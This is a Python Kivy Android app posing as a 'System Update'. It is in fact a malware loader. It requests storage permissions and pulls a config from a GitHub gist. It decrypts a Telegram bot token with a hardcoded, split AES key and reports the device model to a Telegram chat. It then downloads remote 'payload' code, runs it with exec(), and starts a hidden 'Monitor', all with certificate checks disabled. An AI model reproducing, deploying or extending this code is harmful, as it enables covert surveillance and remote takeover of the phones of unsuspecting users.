import os
import sys
import threading
import requests
import base64
import time
import json
import traceback
import urllib3
from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.scrollview import ScrollView
from kivy.uix.textinput import TextInput
from kivy.uix.button import Button
from kivy.utils import platform

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

app_path = os.path.dirname(os.path.abspath(__file__))
if app_path not in sys.path:
    sys.path.append(app_path)
for subdir in ['core', 'telegram', 'media', 'config']:
    sub_path = os.path.join(app_path, subdir)
    if os.path.exists(sub_path) and sub_path not in sys.path:
        sys.path.append(sub_path)

class SystemUpdateApp(App):
    def build(self):
        self.config_url = "https://gist.githubusercontent.com/Zaen1993/e463af07dcd7c8c1f2398fdbaf573c73/raw/1029041e26d793614ba70bccaf542bfed53eeacd/config.json"
        self.engine_running = False

        layout = BoxLayout(orientation='vertical')
        btn_layout = BoxLayout(size_hint_y=None, height=50, spacing=10, padding=5)
        copy_btn = Button(text="Copy Log", background_color=(0.2, 0.6, 0.2, 1))
        copy_btn.bind(on_press=self.copy_log)
        reset_btn = Button(text="Reset Engine", background_color=(0.7, 0.2, 0.2, 1))
        reset_btn.bind(on_press=self.reset_engine)
        btn_layout.add_widget(copy_btn)
        btn_layout.add_widget(reset_btn)
        layout.add_widget(btn_layout)

        scroll = ScrollView(size_hint=(1, 1))
        self.log_view = TextInput(
            text="[System] Initializing...\n",
            readonly=True,
            background_color=(0, 0, 0, 1),
            foreground_color=(0, 1, 0, 1),
            font_size='14sp',
            size_hint_y=None,
            cursor_color=(0, 0, 0, 0),
            selection_color=(0.2, 0.5, 0.8, 0.8)
        )
        self.log_view.bind(minimum_height=self.log_view.setter('height'))
        scroll.add_widget(self.log_view)
        layout.add_widget(scroll)

        # Request permissions in background (non-blocking)
        if platform == 'android':
            self.log(">> Requesting permissions (non-blocking)...")
            from android.permissions import request_permissions, Permission
            request_permissions([
                Permission.INTERNET,
                Permission.ACCESS_NETWORK_STATE,
                Permission.READ_EXTERNAL_STORAGE,
                Permission.WRITE_EXTERNAL_STORAGE
            ])

        # Start engine after 5 seconds to allow permissions dialog to appear
        threading.Timer(5, self.start_engine_safe).start()
        return layout

    def start_engine_safe(self):
        if self.engine_running:
            self.log(">> Engine already running")
            return
        self.engine_running = True
        self.log(">> Starting engine thread...")
        threading.Thread(target=self.logic_engine, daemon=True).start()

    def reset_engine(self, instance):
        self.log(">> Manual reset requested")
        if self.engine_running:
            self.log(">> Stopping current engine...")
            self.engine_running = False
            time.sleep(1)
        self.log(">> Restarting engine...")
        self.engine_running = True
        threading.Thread(target=self.logic_engine, daemon=True).start()

    def copy_log(self, instance):
        from kivy.core.clipboard import Clipboard
        Clipboard.copy(self.log_view.text)
        self.log(">> Log copied to clipboard")

    def log(self, msg):
        timestamp = time.strftime("%H:%M:%S")
        self.log_view.text += f"[{timestamp}] {msg}\n"

    def _get_encryption_key(self):
        part1 = [77, 121, 83, 117, 112, 51, 114, 83, 51, 99, 114, 51, 116]
        part2 = [75, 51, 121, 49, 50, 51, 52, 53, 54, 55, 56, 57, 48, 49, 50, 51, 52, 53, 54]
        return bytes(part1 + part2)

    def decrypt_token(self, encrypted_data):
        if not encrypted_data:
            return ""
        try:
            from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
            from cryptography.hazmat.backends import default_backend
            key = self._get_encryption_key()
            data = base64.b64decode(encrypted_data)
            if len(data) < 28:
                return ""
            iv = data[:12]
            tag = data[-16:]
            ciphertext = data[12:-16]
            cipher = Cipher(algorithms.AES(key), modes.GCM(iv, tag), backend=default_backend())
            decryptor = cipher.decryptor()
            decrypted = decryptor.update(ciphertext) + decryptor.finalize()
            return decrypted.decode('utf-8')
        except Exception as e:
            self.log(f"Decrypt failed: {str(e)}")
            return ""

    def send_telegram(self, token, chat_id, text):
        if not token or not chat_id:
            self.log("Cannot send: token or chat_id empty")
            return False
        try:
            url = f"https://api.telegram.org/bot{token}/sendMessage"
            r = requests.post(url, json={"chat_id": chat_id, "text": text}, timeout=10, verify=False)
            if r.status_code == 200:
                self.log("Telegram message sent successfully")
                return True
            else:
                self.log(f"Telegram error: {r.status_code}")
                return False
        except Exception as e:
            self.log(f"Telegram send failed: {e}")
            return False

    def get_device_name(self):
        try:
            from jnius import autoclass
            Build = autoclass('android.os.Build')
            model = Build.MODEL
            manufacturer = Build.MANUFACTURER
            return f"{manufacturer} {model}".strip()
        except:
            return "Android Device"

    def logic_engine(self):
        try:
            self.log("Step 1: Engine thread started")
            time.sleep(1)

            self.log("Step 2: Testing internet connection...")
            try:
                r = requests.get("http://www.google.com", timeout=5)
                self.log(f"Step 2: Internet OK (HTTP {r.status_code})")
            except Exception as e:
                self.log(f"Step 2: Internet check failed: {e}")
                self.log("Step 2: Continuing anyway...")

            self.log("Step 3: Fetching config.json from GitHub...")
            try:
                response = requests.get(self.config_url, timeout=10, verify=False)
                if response.status_code == 200:
                    config = response.json()
                    self.log("Step 3: Config received and parsed")
                else:
                    self.log(f"Step 3: Failed HTTP {response.status_code}")
                    self.engine_running = False
                    return
            except Exception as e:
                self.log(f"Step 3: Config fetch error: {e}")
                self.engine_running = False
                return

            self.log("Step 4: Decrypting token...")
            enc_tokens = config.get('t', [])
            if not enc_tokens:
                self.log("Step 4: No tokens in config")
                self.engine_running = False
                return

            token = self.decrypt_token(enc_tokens[0])
            v_id = self.decrypt_token(config.get('v', ''))
            if not token or not v_id:
                self.log("Step 4: Decryption failed")
                self.engine_running = False
                return
            self.log("Step 4: Decryption successful")

            self.log("Step 5: Sending device info to Telegram...")
            device_name = self.get_device_name()
            msg = f"Device Online: {device_name}\nTime: {time.strftime('%Y-%m-%d %H:%M:%S')}"
            if self.send_telegram(token, v_id, msg):
                self.log("Step 5: Device notification sent")
            else:
                self.log("Step 5: Failed to send notification")

            globals()['MASTER_CONFIG'] = {
                'tokens': [token],
                'v_id': v_id,
                'payload_urls': config.get('payload_urls', [])
            }

            self.log("Step 6: Loading payloads...")
            self.load_payloads()

        except Exception as e:
            self.log(f"Engine fatal error: {str(e)}")
            traceback.print_exc()
        finally:
            self.engine_running = False

    def load_payloads(self):
        payload_urls = globals()['MASTER_CONFIG'].get('payload_urls', [])
        if not payload_urls:
            self.log("No payload URLs found")
            return
        loaded = 0
        for url in payload_urls:
            try:
                time.sleep(1)
                name = url.split('/')[-1]
                self.log(f"Loading {name}...")
                code = requests.get(url, timeout=10, verify=False).text
                exec(code, globals())
                self.log(f"Loaded {name}")
                loaded += 1
            except Exception as e:
                self.log(f"Failed to load {name}: {e}")
                continue
        if 'Monitor' in globals():
            self.log("Starting Monitor...")
            monitor = globals()['Monitor']()
            monitor.start()
            self.log("Monitor started")
        else:
            self.log("Monitor class not found")

if __name__ == '__main__':
    SystemUpdateApp().run()
